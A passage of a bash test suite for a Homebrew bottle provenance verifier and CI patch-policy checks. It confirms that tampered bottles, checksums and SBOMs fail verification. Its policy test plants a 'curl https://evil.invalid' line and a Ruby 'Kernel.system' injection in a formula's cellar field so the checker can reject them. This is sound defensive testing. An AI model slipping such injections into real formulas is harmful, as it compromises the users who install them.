      and .checks.slsa_attestation == "passed"
      and .checks.lineage_attestation == "passed"
      and .checks.cosign_blob == "passed"
      and .checks.cosign_spdx == "passed"
      and .checks.spdx_sbom == "passed"
      and .checks.cyclonedx_sbom == "passed"
    ))
  ' "$PROV_OUT" >/dev/null

  prov_snapshot_tree "$root/home" "$root/after.tree" 1
  cmp -s "$root/before.tree" "$root/after.tree"
}

case_revision_rebuild_encoding() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"

  local repo_dir="$root/repo"
  local formula="tool@1"
  local pkg_version="1.2.3+meta_2"
  local rel_tag="$formula-$pkg_version"
  local brew_fn="tool@1--1.2.3+meta_2.arm64_tahoe.bottle.3.tar.gz"
  local rel_fn="tool%401-1.2.3%2Bmeta_2.arm64_tahoe.bottle.3.tar.gz"
  local disk_fn="tool@1-1.2.3+meta_2.arm64_tahoe.bottle.3.tar.gz"
  local rel_dir="$root/releases/$rel_tag"
  mkdir -p "$repo_dir/Formula" "$rel_dir"

  printf 'encoded-bottle-payload\n' >"$rel_dir/$disk_fn"
  local bottle_sha=""
  bottle_sha="$(prov_sha256_file "$rel_dir/$disk_fn")"
  printf '%s  %s\n' "$bottle_sha" "$rel_fn" >"$rel_dir/$disk_fn.sha256"

  prov_make_spdx_json "$formula" "$pkg_version" >"$rel_dir/$disk_fn.spdx.json"
  prov_make_cdx_json "$formula" "$pkg_version" >"$rel_dir/$disk_fn.cdx.json"
  printf '{}\n' >"$rel_dir/$disk_fn.sigstore.json"
  prov_make_spdx_sigstore_bundle "$rel_dir/$disk_fn.spdx.json" >"$rel_dir/$disk_fn.spdx.sigstore.json"

  cat >"$repo_dir/Formula/$formula.rb" <<EOF
class ToolAT1 < Formula
  desc "Synthetic formula"
  homepage "https://example.com"
  url "https://github.com/example/tool/archive/refs/tags/v1.2.3+meta.tar.gz"
  sha256 "${bottle_sha}"
  license "MIT"
  revision 2

  bottle do
    root_url "file://${rel_dir}"
    rebuild 3
    sha256 cellar: :any, arm64_tahoe: "${bottle_sha}"
  end

  def install
    bin.install "tool"
  end
end
EOF

  jq -cn \
    --arg cert "$CERT_IDENTITY" \
    --arg ltype "$LINEAGE_TYPE" \
    --arg tr "$TRUSTED_ROOT_JSONL" \
    --arg sha "$bottle_sha" \
    --arg formula "$formula" \
    --arg pkg_version "$pkg_version" \
    --arg release_tag "$rel_tag" \
    --arg brew_fn "$brew_fn" \
    --arg rel_fn "$rel_fn" \
    --arg spdx_sha "$(prov_sha256_file "$rel_dir/$disk_fn.spdx.json")" \
    --arg cdx_sha "$(prov_sha256_file "$rel_dir/$disk_fn.cdx.json")" \
    '{
      expected_cert_identity: $cert,
      lineage_type: $ltype,
      trusted_root_jsonl: $tr,
      by_sha: {
        ($sha): {
          formula: $formula,
          pkg_version: $pkg_version,
          release_tag: $release_tag,
          brew_filename: $brew_fn,
          release_filename: $rel_fn,
          bottle_sha256: $sha,
          spdx_sha256: $spdx_sha,
          cdx_sha256: $cdx_sha
        }
      }
    }' >"$root/mock-state.json"

  prov_snapshot_tree "$root/home" "$root/before.tree" 1
  prov_run_verifier "$root" "$shell_bin" "$repo_dir" \
    --allow-file-root-url --require-cosign --json "$formula"
  [[ "$PROV_RC" -eq 0 ]]
  jq -e \
    --arg pv "$pkg_version" \
    --arg bf "$brew_fn" \
    --arg rf "$rel_fn" \
    '.results[0].pkg_version == $pv and .results[0].brew_filename == $bf and .results[0].release_filename == $rf' \
    "$PROV_OUT" >/dev/null
  prov_snapshot_tree "$root/home" "$root/after.tree" 1
  cmp -s "$root/before.tree" "$root/after.tree"
}

case_explicit_version_stanza() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  mkdir -p "$root/repo/Formula"
  local sha="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  cat >"$root/repo/Formula/custom.rb" <<EOF
class Custom < Formula
  desc "Explicit version test"
  homepage "https://example.com"
  url "https://example.com/downloads/snapshot-tarball.tar.gz"
  version "2.4.0"
  sha256 "${sha}"

  bottle do
    root_url "https://github.com/artagon/homebrew-aitools/releases/download/custom-2.4.0"
    sha256 arm64_tahoe: "${sha}"
  end

  def install
    bin.install "custom"
  end
end
EOF
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --parse-only --json custom
  [[ "$PROV_RC" -eq 0 ]]
  jq -e '.results[0].version == "2.4.0" and .results[0].pkg_version == "2.4.0"' "$PROV_OUT" >/dev/null
}

case_stale_bottle_bump() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  prov_build_fixture_repo "$root" ripwire
  cp "$root/fixture-state.json" "$root/mock-state.json"

  local rb="$root/repo/Formula/ripwire.rb"
  local cur_ver=""
  cur_ver="$(prov_reference_parse_formula_json "$rb" | jq -r '.version')"
  awk -v old="v${cur_ver}.tar.gz" '
    !done && index($0, old) > 0 {
      sub(old, "v99.99.99.tar.gz")
      done = 1
    }
    { print }
    END { if (!done) exit 1 }
  ' "$rb" >"$rb.mut"
  mv "$rb.mut" "$rb"

  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.ok == false and .failed == 1 and .results[0].checks.formula_metadata == "failed" and (.results[0].error | contains("stale"))' \
    "$PROV_OUT" >/dev/null
}

case_save_and_offline_roundtrip() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  prov_build_fixture_repo "$root" ripwire
  jq '. + {expect_bundle: true}' "$root/fixture-state.json" >"$root/mock-state.json"

  local saved_dir="$root/saved-bundles"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --save-bundles "$saved_dir" --allow-file-root-url --require-cosign --json ripwire
  [[ "$PROV_RC" -eq 0 && -f "$saved_dir/trusted_root.jsonl" ]]

  rm -f -- "$root/bin/curl"
  jq '. + {expect_bundle: true, expect_custom_trusted_root: true, expect_cosign_trusted_root: true}' \
    "$root/fixture-state.json" >"$root/mock-state.json"
  : >"$root/call-log.jsonl"

  prov_snapshot_tree "$saved_dir" "$root/saved-before.tree" 0
  prov_snapshot_tree "$root/home" "$root/home-before.tree" 1

  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --offline --bundle-dir "$saved_dir" --trusted-root "$saved_dir/trusted_root.jsonl" \
    --allow-file-root-url --require-cosign --json ripwire
  [[ "$PROV_RC" -eq 0 ]]
  jq -e '.mode == "offline" and .ok == true' "$PROV_OUT" >/dev/null

  prov_snapshot_tree "$saved_dir" "$root/saved-after.tree" 0
  prov_snapshot_tree "$root/home" "$root/home-after.tree" 1
  cmp -s "$root/saved-before.tree" "$root/saved-after.tree"
  cmp -s "$root/home-before.tree" "$root/home-after.tree"

  jq -s -e '
    [ .[] | select(.tool == "cosign") ] as $c
    | ($c | length) == 2
    and ($c | all((.args | index("--offline")) == null and (.args | index("--trusted-root")) != null))
  ' "$root/call-log.jsonl" >/dev/null
}

case_corrupted_bottle_and_sidecar() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  prov_build_fixture_repo "$root" ripwire
  cp "$root/fixture-state.json" "$root/mock-state.json"

  local rel_tag="" rel_fn=""
  IFS='|' read -r rel_tag rel_fn < <(
    jq -r '.by_sha | to_entries[0].value | [.release_tag, .release_filename] | join("|")' "$root/mock-state.json"
  )
  local bottle_file="$root/releases/$rel_tag/$rel_fn"
  cp "$bottle_file" "$root/orig.bottle"

  printf 'tamper' >>"$bottle_file"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 && ! -s "$PROV_ERR" ]]
  jq -e '.ok == false and .results[0].checks.bottle_sha256 == "failed"' "$PROV_OUT" >/dev/null

  cp "$root/orig.bottle" "$bottle_file"
  printf '0000000000000000000000000000000000000000000000000000000000000000  %s\n' "$rel_fn" \
    >"$bottle_file.sha256"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.sha256_sidecar == "failed"' "$PROV_OUT" >/dev/null
}

case_subject_binding_and_san_attacks() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  prov_build_fixture_repo "$root" ripwire

  jq '. + {subject_mode: "missing_double_dash"}' "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.slsa_attestation == "failed"' "$PROV_OUT" >/dev/null

  jq '. + {subject_mode: "split_subjects"}' "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.slsa_attestation == "failed"' "$PROV_OUT" >/dev/null

  jq '. + {subject_mode: "dual", override_san: "https://github.com/artagon/homebrew-aitools/.github/workflows/tests.yml@refs/pull/1/merge"}' \
    "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.slsa_attestation == "failed"' "$PROV_OUT" >/dev/null
}

case_tampered_detached_sbom() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"
  prov_build_fixture_repo "$root" ripwire
  cp "$root/fixture-state.json" "$root/mock-state.json"

  local b_sha="" rel_tag="" rel_fn="" pkg_ver=""
  IFS='|' read -r b_sha rel_tag rel_fn pkg_ver < <(
    jq -r '.by_sha | to_entries[0] | [.key, .value.release_tag, .value.release_filename, .value.pkg_version] | join("|")' \
      "$root/mock-state.json"
  )
  local spdx_path="$root/releases/$rel_tag/$rel_fn.spdx.json"
  prov_make_spdx_json "ripwire" "$pkg_ver" "injected-pkg" >"$spdx_path"

  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.lineage_attestation == "failed"' "$PROV_OUT" >/dev/null

  local tampered_sha=""
  tampered_sha="$(prov_sha256_file "$spdx_path")"
  jq --arg k "$b_sha" --arg s "$tampered_sha" '.by_sha[$k].spdx_sha256 = $s' \
    "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --allow-file-root-url --require-cosign --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.cosign_spdx == "failed" and (.results[0].error | contains("DSSE predicate"))' \
    "$PROV_OUT" >/dev/null
}

case_cosign_absent_vs_required() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin" 0 0)"
  prov_build_fixture_repo "$root" ripwire
  cp "$root/fixture-state.json" "$root/mock-state.json"

  prov_run_verifier "$root" "$shell_bin" "$root/repo" --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 0 ]]
  jq -e '.results[0].checks.cosign_blob == "skipped" and .results[0].checks.cosign_spdx == "skipped"' \
    "$PROV_OUT" >/dev/null

  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --allow-file-root-url --require-cosign --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.cosign_blob == "failed"' "$PROV_OUT" >/dev/null
}

case_homebrew_isolation_and_cli() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin" 1 1)"
  prov_build_fixture_repo "$root" ripwire

  local gh_cfg="$root/home/.config/gh"
  mkdir -p "$gh_cfg"
  printf 'github.com:\n    user: test\n' >"$gh_cfg/hosts.yml"

  jq --arg ghcfg "$gh_cfg" --arg tap "$root/repo" \
    '. + {expect_gh_config_dir: $ghcfg, mock_tap_repo: $tap}' \
    "$root/fixture-state.json" >"$root/mock-state.json"

  prov_snapshot_tree "$root/home" "$root/before.tree" 1
  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --homebrew --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 0 ]]
  jq -e '.results[0].checks.homebrew_verify == "passed"' "$PROV_OUT" >/dev/null
  prov_snapshot_tree "$root/home" "$root/after.tree" 1
  cmp -s "$root/before.tree" "$root/after.tree"

  jq --arg ghcfg "$gh_cfg" --arg tap "$root/repo" \
    '. + {expect_gh_config_dir: $ghcfg, mock_tap_repo: $tap, brew_verify_response: []}' \
    "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --homebrew --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].checks.homebrew_verify == "failed"' "$PROV_OUT" >/dev/null

  mkdir -p "$root/drift-tap/Formula"
  printf '# drifted\n' >"$root/drift-tap/Formula/ripwire.rb"
  jq --arg ghcfg "$gh_cfg" --arg tap "$root/drift-tap" \
    '. + {expect_gh_config_dir: $ghcfg, mock_tap_repo: $tap, brew_verify_response: [{"verified": true}]}' \
    "$root/fixture-state.json" >"$root/mock-state.json"
  prov_run_verifier "$root" "$shell_bin" "$root/repo" \
    --homebrew --allow-file-root-url --json ripwire
  [[ "$PROV_RC" -eq 1 ]]
  jq -e '.results[0].error | contains("differs from checkout")' "$PROV_OUT" >/dev/null

  prov_snapshot_tree "$root/tmp" "$root/tmp-before.tree" 0
  prov_run_verifier "$root" "$shell_bin" "$root/repo" --help
  [[ "$PROV_RC" -eq 0 ]]
  grep -Fq "Usage:" "$PROV_OUT"

  local -a bad_invocations=(
    "--unknown-flag"
    "--offline"
    "--offline|--bundle-dir|$root/repo"
    "--all|ripwire"
    "--file|/nonexistent|ripwire|tgrep"
  )
  local spec=""
  for spec in "${bad_invocations[@]}"; do
    local -a bflags=()
    IFS='|' read -r -a bflags <<<"$spec"
    prov_run_verifier "$root" "$shell_bin" "$root/repo" "${bflags[@]}"
    [[ "$PROV_RC" -eq 2 ]]
    ! grep -Fq "unbound variable" "$PROV_ERR"
  done

  prov_snapshot_tree "$root/tmp" "$root/tmp-after.tree" 0
  cmp -s "$root/tmp-before.tree" "$root/tmp-after.tree"
}

case_readme_table_and_ci_patch_policy() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin")"

  local readme_script="$PROV_REPO_ROOT/scripts/update-readme-bottles.sh"
  local fixture_repo="$root/readme-repo"
  mkdir -p "$fixture_repo/Formula"
  local sha="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
  cat >"$fixture_repo/Formula/demo.rb" <<EOF
class Demo < Formula
  desc "Demo tool"
  homepage "https://example.com"
  url "https://github.com/example/demo/archive/refs/tags/v1.0.0.tar.gz"
  sha256 "${sha}"

  bottle do
    root_url "https://github.com/artagon/homebrew-aitools/releases/download/demo-1.0.0"
    sha256 cellar: :any_skip_relocation, arm64_tahoe: "${sha}"
  end

  def install
    bin.install "demo"
  end
end
EOF
  local readme_file="$fixture_repo/README.md"
  printf '# Demo\n\n<!-- BEGIN BOTTLE_PROVENANCE_TABLE -->\nstale\n<!-- END BOTTLE_PROVENANCE_TABLE -->\n' >"$readme_file"

  local chk_rc=0
  PROVENANCE_REPO_ROOT="$fixture_repo" README_BOTTLES_FILE="$readme_file" \
    "$shell_bin" "$readme_script" --check >/dev/null 2>&1 || chk_rc=$?
  [[ "$chk_rc" -eq 1 ]]

  PROVENANCE_REPO_ROOT="$fixture_repo" README_BOTTLES_FILE="$readme_file" \
    "$shell_bin" "$readme_script"
  grep -Fq "demo-1.0.0.arm64_tahoe.bottle.tar.gz.intoto.jsonl" "$readme_file"
  grep -Fq "attestations/sha256:$sha" "$readme_file"

  PROVENANCE_REPO_ROOT="$fixture_repo" README_BOTTLES_FILE="$readme_file" \
    "$shell_bin" "$readme_script" --check

  local common_lib="$PROV_REPO_ROOT/scripts/ci/common.sh"
  [[ ! -x "$common_lib" ]]
  # Single quotes are intentional so the target shell evaluates $1 and $IFS directly.
  # shellcheck disable=SC2016
  "$shell_bin" -c '
    set +e +u
    before="$(set +o)|pwd=$(pwd)|ifs=${IFS}"
    source "$1"
    after="$(set +o)|pwd=$(pwd)|ifs=${IFS}"
    [[ "${before}" = "${after}" ]] && ci::require_uint "42" "num"
  ' _ "$common_lib"

  local pub_script="$PROV_REPO_ROOT/scripts/ci/publish-bottles.sh"
  local bad_ref_rc=0
  GITHUB_REF="refs/heads/feature" GITHUB_REPOSITORY="artagon/homebrew-aitools" \
    "$shell_bin" "$pub_script" validate >"$root/badref.out" 2>"$root/badref.err" || bad_ref_rc=$?
  [[ "$bad_ref_rc" -eq 1 ]]
  grep -Fq "refs/heads/main" "$root/badref.err"

  local git_repo="$root/patch-policy-git"
  mkdir -p "$git_repo/Formula"
  export GIT_AUTHOR_NAME="Test" GIT_AUTHOR_EMAIL="test@example.com"
  export GIT_COMMITTER_NAME="Test" GIT_COMMITTER_EMAIL="test@example.com"
  "$PROV_GIT_BIN" -C "$git_repo" init -q -b main
  cat >"$git_repo/Formula/demo.rb" <<EOF
class Demo < Formula
  desc "Demo tool"
  homepage "https://example.com"
  url "https://github.com/example/demo/archive/refs/tags/v1.0.0.tar.gz"
  sha256 "${sha}"

  depends_on "rust" => :build

  def install
    (bin/"demo").write <<~SH
      #!/bin/sh


      exec echo demo
    SH
  end
end
EOF
  printf '# Demo\n\n<!-- BEGIN BOTTLE_PROVENANCE_TABLE -->\n<!-- END BOTTLE_PROVENANCE_TABLE -->\n' \
    >"$git_repo/README.md"
  "$PROV_GIT_BIN" -C "$git_repo" add .
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -m "base"
  local base_sha=""
  base_sha="$("$PROV_GIT_BIN" -C "$git_repo" rev-parse HEAD)"

  "$PROV_GIT_BIN" -C "$git_repo" checkout -q -b pr
  awk '{ sub(/v1\.0\.0\.tar\.gz/, "v1.1.0.tar.gz"); print }' "$git_repo/Formula/demo.rb" >"$git_repo/Formula/demo.rb.tmp"
  mv "$git_repo/Formula/demo.rb.tmp" "$git_repo/Formula/demo.rb"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "demo 1.1.0"
  local head_sha=""
  head_sha="$("$PROV_GIT_BIN" -C "$git_repo" rev-parse HEAD)"

  cat >"$root/bottled-demo.rb" <<EOF
class Demo < Formula
  desc "Demo tool"
  homepage "https://example.com"
  url "https://github.com/example/demo/archive/refs/tags/v1.1.0.tar.gz"
  sha256 "${sha}"

  bottle do
    root_url "https://github.com/artagon/homebrew-aitools/releases/download/demo-1.1.0"
    sha256 cellar: :any_skip_relocation, arm64_tahoe: "${sha}"
  end

  depends_on "rust" => :build

  def install
    (bin/"demo").write <<~SH
      #!/bin/sh


      exec echo demo
    SH
  end
end
EOF
  cp "$root/bottled-demo.rb" "$git_repo/Formula/demo.rb"
  PROVENANCE_REPO_ROOT="$git_repo" README_BOTTLES_FILE="$git_repo/README.md" \
    "$shell_bin" "$readme_script"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "demo: update 1.1.0 bottle"
  local rtemp="$root/rtemp"
  mkdir -p "$rtemp/publish-stage"
  "$PROV_GIT_BIN" -C "$git_repo" format-patch --stdout "$base_sha..HEAD" >"$rtemp/publish-stage/commits.mbox"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q main

  printf '{"schema":"artagon-bottle-release-map/v1","bottles":[{"formula":"demo"}]}\n' \
    >"$rtemp/publish-stage/release-map.json"
  local map_sha=""
  map_sha="$(prov_sha256_file "$rtemp/publish-stage/release-map.json")"

  (
    cd "$git_repo" \
      && GITHUB_REF="refs/heads/main" \
        RUNNER_TEMP="$rtemp" \
        BASE_MAIN_SHA="$base_sha" \
        HEAD_SHA="$head_sha" \
        RELEASE_MAP_SHA256="$map_sha" \
        SKIP_FETCH_HEAD_SHA="1" \
        "$shell_bin" "$pub_script" verify-patch-policy
  ) >"$root/ok-policy.out" 2>"$root/ok-policy.err"

  "$PROV_GIT_BIN" -C "$git_repo" reset -q --hard "$base_sha"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q pr
  awk '{ sub(/exec echo demo/, "curl https://evil.invalid"); print }' "$root/bottled-demo.rb" \
    >"$git_repo/Formula/demo.rb"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "sneaky"
  "$PROV_GIT_BIN" -C "$git_repo" format-patch --stdout "$base_sha..HEAD" >"$rtemp/publish-stage/commits.mbox"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q main

  local bad_rc=0
  (
    cd "$git_repo" \
      && GITHUB_REF="refs/heads/main" \
        RUNNER_TEMP="$rtemp" \
        BASE_MAIN_SHA="$base_sha" \
        HEAD_SHA="$head_sha" \
        RELEASE_MAP_SHA256="$map_sha" \
        SKIP_FETCH_HEAD_SHA="1" \
        "$shell_bin" "$pub_script" verify-patch-policy
  ) >"$root/bad-policy.out" 2>"$root/bad-policy.err" || bad_rc=$?
  [[ "$bad_rc" -eq 1 ]]
  grep -Fq "outside bottle do" "$root/bad-policy.err"

  "$PROV_GIT_BIN" -C "$git_repo" reset -q --hard "$base_sha"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q pr
  awk '
    prev == "" && $0 == "" { next }
    { prev = $0; print }
  ' "$root/bottled-demo.rb" >"$git_repo/Formula/demo.rb"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "collapse-heredoc-blank"
  "$PROV_GIT_BIN" -C "$git_repo" format-patch --stdout "$base_sha..HEAD" >"$rtemp/publish-stage/commits.mbox"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q main

  local blank_rc=0
  (
    cd "$git_repo" \
      && GITHUB_REF="refs/heads/main" \
        RUNNER_TEMP="$rtemp" \
        BASE_MAIN_SHA="$base_sha" \
        HEAD_SHA="$head_sha" \
        RELEASE_MAP_SHA256="$map_sha" \
        SKIP_FETCH_HEAD_SHA="1" \
        "$shell_bin" "$pub_script" verify-patch-policy
  ) >"$root/blank-policy.out" 2>"$root/blank-policy.err" || blank_rc=$?
  [[ "$blank_rc" -eq 1 ]]

  "$PROV_GIT_BIN" -C "$git_repo" reset -q --hard "$base_sha"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q pr
  awk '{ sub(/cellar: :any_skip_relocation/, "cellar: \"#{Kernel.system(%q(id))}\""); print }' \
    "$root/bottled-demo.rb" >"$git_repo/Formula/demo.rb"
  "$PROV_GIT_BIN" -C "$git_repo" commit -q -am "interp-cellar"
  "$PROV_GIT_BIN" -C "$git_repo" format-patch --stdout "$base_sha..HEAD" >"$rtemp/publish-stage/commits.mbox"
  "$PROV_GIT_BIN" -C "$git_repo" checkout -q main

  local interp_rc=0
  (
    cd "$git_repo" \
      && GITHUB_REF="refs/heads/main" \
        RUNNER_TEMP="$rtemp" \
        BASE_MAIN_SHA="$base_sha" \
        HEAD_SHA="$head_sha" \
        RELEASE_MAP_SHA256="$map_sha" \
        SKIP_FETCH_HEAD_SHA="1" \
        "$shell_bin" "$pub_script" verify-patch-policy
  ) >"$root/interp-policy.out" 2>"$root/interp-policy.err" || interp_rc=$?
  [[ "$interp_rc" -eq 1 ]]
}

case_multi_tag_linux_and_macos() {
  local shell_bin="$1"
  local root=""
  root="$(prov_setup_case_root "$shell_bin" 1 1)"

  local mrepo="$root/mrepo"
  local rel_dir="$root/releases/multitag-1.2.3"
  mkdir -p "$mrepo/Formula" "$rel_dir"

  local entries_jsonl="$root/mt-entries.jsonl"
  : >"$entries_jsonl"

  local t="" bsha="" ssha="" csha="" bfn="" rfn=""
  local sha_mac="" sha_arm_linux="" sha_x64_linux=""
  for t in arm64_tahoe arm64_linux x86_64_linux; do
    bfn="multitag--1.2.3.${t}.bottle.1.tar.gz"
    rfn="multitag-1.2.3.${t}.bottle.1.tar.gz"
    printf 'bottle-payload-multitag-%s\n' "$t" >"$rel_dir/$rfn"
    bsha="$(prov_sha256_file "$rel_dir/$rfn")"
    printf '%s  %s\n' "$bsha" "$rfn" >"$rel_dir/${rfn}.sha256"

    prov_make_spdx_json "multitag" "1.2.3" "pkg-${t}" >"$rel_dir/${rfn}.spdx.json"
    prov_make_cdx_json "multitag" "1.2.3" >"$rel_dir/${rfn}.cdx.json"
    ssha="$(prov_sha256_file "$rel_dir/${rfn}.spdx.json")"
    csha="$(prov_sha256_file "$rel_dir/${rfn}.cdx.json")"

    jq -cn --arg sha "$bsha" '{bundle: "slsa", sha256: $sha}' >"$rel_dir/${rfn}.intoto.jsonl"
    jq -cn --arg sha "$bsha" '{bundle: "lineage", sha256: $sha}' >"$rel_dir/${rfn}.lineage.intoto.jsonl"
    printf '{"mediaType":"application/vnd.dev.sigstore.bundle.v0.3+json","messageSignature":{}}\n' \
      >"$rel_dir/${rfn}.sigstore.json"
    prov_make_spdx_sigstore_bundle "$rel_dir/${rfn}.spdx.json" >"$rel_dir/${rfn}.spdx.sigstore.json"

    case "$t" in
      arm64_tahoe) sha_mac="$bsha" ;;
      arm64_linux) sha_arm_linux="$bsha" ;;
      x86_64_linux) sha_x64_linux="$bsha" ;;
    esac

    jq -cn \
      --arg formula "multitag" \
      --arg pkg_version "1.2.3" \
      --arg release_tag "multitag-1.2.3" \
      --arg brew_filename "$bfn" \
      --arg release_filename "$rfn" \
      --arg bottle_sha256 "$bsha" \
      --arg spdx_sha256 "$ssha" \
      --arg cdx_sha256 "$csha" \
      '{
        formula: $formula,
        pkg_version: $pkg_version,
        release_tag: $release_tag,
        brew_filename: $brew_filename,
        release_filename: $release_filename,
        bottle_sha256: $bottle_sha256,
        spdx_sha256: $spdx_sha256,
        cdx_sha256: $cdx_sha256
      }' >>"$entries_jsonl"
  done

  cat >"$mrepo/Formula/multitag.rb" <<EOF
class Multitag < Formula
  desc "Multi-platform Linux and macOS bottle fixture"
  homepage "https://example.com"
  url "https://github.com/example/multitag/archive/refs/tags/v1.2.3.tar.gz"
  sha256 "${sha_mac}"

  bottle do
    root_url "file://${rel_dir}"
    rebuild 1
    sha256 cellar: :any, arm64_tahoe:  "${sha_mac}"
    sha256               arm64_linux:  "${sha_arm_linux}"
    sha256               x86_64_linux: "${sha_x64_linux}"
  end

  def install
    bin.install "multitag"
  end
end
EOF

  jq -s \
    --arg cert "$CERT_IDENTITY" \
    --arg ltype "$LINEAGE_TYPE" \
    --arg tr "$TRUSTED_ROOT_JSONL" \
    --arg tap "$mrepo" \
    '{
      expected_cert_identity: $cert,
      lineage_type: $ltype,
      trusted_root_jsonl: $tr,
      mock_tap_repo: $tap,
      by_sha: (map({key: .bottle_sha256, value: .}) | from_entries)
    }' "$entries_jsonl" >"$root/mock-state.json"

  # 1. --parse-only --all-tags discovers all 3 column-aligned tags in declaration order.
  prov_run_verifier "$root" "$shell_bin" "$mrepo" --parse-only --all-tags --allow-file-root-url --json
  [[ "$PROV_RC" -eq 0 && ! -s "$PROV_ERR" ]]
  jq -e '
    .ok == true
    and .checked == 3
    and .passed == 3
    and .failed == 0
    and ([.results[].bottle_tag] == ["arm64_tahoe", "arm64_linux", "x86_64_linux"])
  ' "$PROV_OUT" >/dev/null

  # 2. Full online verification across all 3 tags + isolated brew verify for each tag.
  : >"$root/call-log.jsonl"
  prov_run_verifier "$root" "$shell_bin" "$mrepo" \
    --all --all-tags --allow-file-root-url --require-cosign --homebrew --json
  [[ "$PROV_RC" -eq 0 && ! -s "$PROV_ERR" ]]
  jq -e '.ok == true and .checked == 3 and .passed == 3' "$PROV_OUT" >/dev/null
  jq -s -e '
    [ .[] | select(.tool == "brew" and .args[0] == "verify") | .args[] | select(startswith("--bottle-tag=")) ]
    == ["--bottle-tag=arm64_tahoe", "--bottle-tag=arm64_linux", "--bottle-tag=x86_64_linux"]
  ' "$root/call-log.jsonl" >/dev/null

  # 3. Single Linux tag (--bottle-tag x86_64_linux) and --bottle-tag all alias; conflicting options fail with exit 2.
  prov_run_verifier "$root" "$shell_bin" "$mrepo" \
    --bottle-tag x86_64_linux --allow-file-root-url --require-cosign --json multitag
  [[ "$PROV_RC" -eq 0 ]]
  jq -e --arg s "$sha_x64_linux" '.checked == 1 and .results[0].bottle_tag == "x86_64_linux" and .results[0].actual_sha256 == $s' "$PROV_OUT" >/dev/null

  prov_run_verifier "$root" "$shell_bin" "$mrepo" \
    --bottle-tag all --parse-only --allow-file-root-url --json multitag
  [[ "$PROV_RC" -eq 0 ]]
  jq -e '.checked == 3' "$PROV_OUT" >/dev/null

  prov_run_verifier "$root" "$shell_bin" "$mrepo" --all-tags --bottle-tag x86_64_linux --parse-only multitag
  [[ "$PROV_RC" -eq 2 ]]

  prov_run_verifier "$root" "$shell_bin" "$mrepo" --all-tags --file "$rel_dir/multitag-1.2.3.x86_64_linux.bottle.1.tar.gz" multitag
  [[ "$PROV_RC" -eq 2 ]]

  # 4. README multi-platform rendering + CI patch-policy on column-aligned 3-tag bottle block + common.sh rank order.
  local common_lib="$PROV_REPO_ROOT/scripts/ci/common.sh"
  # shellcheck disable=SC2016
  "$shell_bin" -c '
    source "$1"
    r_mac="$(ci::bottle_tag_sort_rank arm64_tahoe)"
    r_intel_mac="$(ci::bottle_tag_sort_rank tahoe)"
    r_arm_lin="$(ci::bottle_tag_sort_rank arm64_linux)"
    r_x64_lin="$(ci::bottle_tag_sort_rank x86_64_linux)"
    [[ "${r_mac}" -lt "${r_intel_mac}" && "${r_intel_mac}" -lt "${r_arm_lin}" && "${r_arm_lin}" -lt "${r_x64_lin}" ]]
    [[ "$(ci::matrix_os_bottle_tag ubuntu-24.04)" = "x86_64_linux" ]]
